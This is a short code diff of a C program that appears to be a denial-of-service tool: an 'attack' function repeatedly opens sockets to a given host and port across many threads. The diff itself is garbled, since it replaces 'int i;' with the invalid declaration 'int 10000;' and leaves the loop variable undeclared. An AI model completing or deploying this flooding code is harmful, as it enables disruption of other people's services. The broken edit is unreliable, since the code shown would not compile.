@@ -48,14 +48,14 @@ void broke(int s) {
 
 #define CONNECTIONS 8
 #define THREADS 48
-int i;
+int 10000;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
 	for(x=0; x != CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(i >= 1000) {
+	while(i < 10000) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
